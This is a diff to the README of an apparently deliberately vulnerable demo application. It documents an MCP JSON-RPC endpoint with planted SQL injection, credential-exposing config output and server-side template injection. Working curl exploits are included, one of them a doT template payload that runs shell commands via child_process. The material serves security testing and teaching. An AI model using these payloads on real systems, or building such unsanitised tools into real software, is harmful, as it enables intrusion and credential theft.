@@ -1231,3 +1231,104 @@ Full configuration & usage examples can be found in our [demo project](https://g
   ![Insecure Output Handling Demonstration](docs/insecure_output_handling.gif)
 
   </details>
+
+- **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools:
+
+  - **SQL Injection via count_tool** - The `count_tool` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
+  - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
+  - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
+
+  <details>
+    <summary>MCP Vulnerabilities Example Exploitation</summary>
+
+  1. **Listing available tools**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/mcp' -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{"jsonrpc": "2.0", "method": "tools/list", "id": 1}'
+     ```
+
+  2. **SQL Injection via count_tool**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/mcp' -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "count_tool",
+           "arguments": {
+             "query": "select count(table_name) as count from information_schema.tables"
+           }
+         },
+         "id": 2
+       }'
+     ```
+
+     Response:
+
+     ```json
+     {
+       "jsonrpc": "2.0",
+       "result": {
+         "content": [{ "type": "text", "text": "Query result: 214" }]
+       },
+       "id": 2
+     }
+     ```
+
+  3. **Sensitive Data Exposure via config_tool**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/mcp' -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "config_tool",
+           "arguments": {}
+         },
+         "id": 3
+       }'
+     ```
+
+     Response:
+
+     ```json
+     {
+       "jsonrpc": "2.0",
+       "result": {
+         "content": [{
+           "type": "text",
+           "text": "{\n  \"awsBucket\": \"https://neuralegion-open-bucket.s3.amazonaws.com\",\n  \"sql\": \"postgres://bc:bc@db:5432/bc\",\n  \"googlemaps\": \"AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ\"\n}"
+         }]
+       },
+       "id": 3
+     }
+     ```
+
+  4. **Server-Side Template Injection via render_tool**:
+
+     ```bash
+     curl 'https://brokencrystals.com/api/mcp' -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "render_tool",
+           "arguments": {
+             "numbers": [1],
+             "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
+           }
+         },
+         "id": 4
+       }'
+     ```
+
+     This payload executes arbitrary system commands through the template injection vulnerability.
+
+  </details>
